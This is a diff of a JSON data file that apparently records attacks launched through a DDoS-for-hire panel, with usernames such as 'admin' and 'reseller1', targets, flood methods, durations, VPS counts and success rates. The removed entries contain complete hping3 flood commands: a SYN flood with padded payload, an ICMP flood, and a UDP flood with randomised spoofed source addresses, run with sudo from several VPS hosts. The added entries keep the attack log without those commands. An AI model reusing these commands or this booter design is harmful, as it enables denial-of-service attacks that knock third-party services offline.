@@ -1,106 +1,30 @@
 [
   {
-    "id": "attack_1705334400000_abc123",
-    "userId": 1,
-    "username": "admin",
+    "id": 1,
     "target": "192.168.1.1:80",
-    "method": "syn-gbps",
-    "duration": 60,
-    "startTime": "2024-01-15T10:00:00.000Z",
-    "endTime": "2024-01-15T10:01:00.000Z",
-    "status": "completed",
-    "vpsUsed": 4,
-    "successRate": "100%",
-    "estimatedPower": "4.2 Gbps",
-    "command": "sudo timeout 60s hping3 -S --flood --data 65495 -p 80 192.168.1.1",
-    "results": {
-      "total": 4,
-      "successful": 4,
-      "failed": 0,
-      "details": [
-        {"host": "192.168.1.100", "success": true, "time": "0.45s"},
-        {"host": "203.0.113.50", "success": true, "time": "0.52s"},
-        {"host": "vps4.example.com", "success": true, "time": "0.61s"},
-        {"host": "vps5.network.io", "success": true, "time": "0.38s"}
-      ]
-    }
-  },
-  {
-    "id": "attack_1705338000000_def456",
-    "userId": 2,
-    "username": "reseller1",
-    "target": "example.com:443",
     "method": "syn-pps",
-    "duration": 120,
-    "startTime": "2024-01-15T11:00:00.000Z",
-    "endTime": "2024-01-15T11:02:00.000Z",
+    "duration": 60,
     "status": "completed",
-    "vpsUsed": 3,
-    "successRate": "75%",
-    "estimatedPower": "150,000 PPS",
-    "command": "sudo timeout 120s hping3 -S --flood -p 443 example.com",
-    "results": {
-      "total": 4,
-      "successful": 3,
-      "failed": 1,
-      "details": [
-        {"host": "192.168.1.100", "success": true, "time": "0.42s"},
-        {"host": "203.0.113.50", "success": true, "time": "0.48s"},
-        {"host": "198.51.100.25", "success": false, "error": "Connection timeout"},
-        {"host": "vps5.network.io", "success": true, "time": "0.35s"}
-      ]
-    }
-  },
-  {
-    "id": "attack_1705341600000_ghi789",
-    "userId": 3,
-    "username": "user1",
-    "target": "testserver.local:22",
-    "method": "icmp-pps",
-    "duration": 30,
-    "startTime": "2024-01-15T12:00:00.000Z",
-    "endTime": "2024-01-15T12:00:30.000Z",
-    "status": "completed",
-    "vpsUsed": 2,
-    "successRate": "50%",
-    "estimatedPower": "80,000 PPS",
-    "command": "sudo timeout 30s hping3 --icmp --flood testserver.local",
-    "results": {
-      "total": 4,
-      "successful": 2,
-      "failed": 2,
-      "details": [
-        {"host": "192.168.1.100", "success": true, "time": "0.51s"},
-        {"host": "203.0.113.50", "success": false, "error": "Permission denied"},
-        {"host": "198.51.100.25", "success": false, "error": "VPS offline"},
-        {"host": "vps4.example.com", "success": true, "time": "0.58s"}
-      ]
-    }
-  },
-  {
-    "id": "attack_1705345200000_jkl012",
     "userId": 1,
     "username": "admin",
-    "target": "target.com:8080",
-    "method": "rand-udp",
-    "duration": 180,
-    "startTime": "2024-01-15T13:00:00.000Z",
-    "endTime": "2024-01-15T13:03:00.000Z",
-    "status": "completed",
-    "vpsUsed": 5,
-    "successRate": "100%",
-    "estimatedPower": "2.1 Gbps",
-    "command": "sudo timeout 180s hping3 --udp --flood --rand-source -p 8080 target.com",
-    "results": {
-      "total": 5,
-      "successful": 5,
-      "failed": 0,
-      "details": [
-        {"host": "192.168.1.100", "success": true, "time": "0.39s"},
-        {"host": "203.0.113.50", "success": true, "time": "0.44s"},
-        {"host": "vps4.example.com", "success": true, "time": "0.62s"},
-        {"host": "vps5.network.io", "success": true, "time": "0.33s"}
-      ]
-    }
+    "startTime": "2024-01-10T10:30:00.000Z",
+    "endTime": "2024-01-10T10:31:00.000Z",
+    "power": 5,
+    "successfulVPS": 2,
+    "totalVPS": 2
+  },
+  {
+    "id": 2,
+    "target": "example.com:443",
+    "method": "ack-gbps",
+    "duration": 120,
+    "status": "running",
+    "userId": 1,
+    "username": "admin",
+    "startTime": "2024-01-10T12:00:00.000Z",
+    "endTime": null,
+    "power": 8,
+    "successfulVPS": 1,
+    "totalVPS": 2
   }
 ]
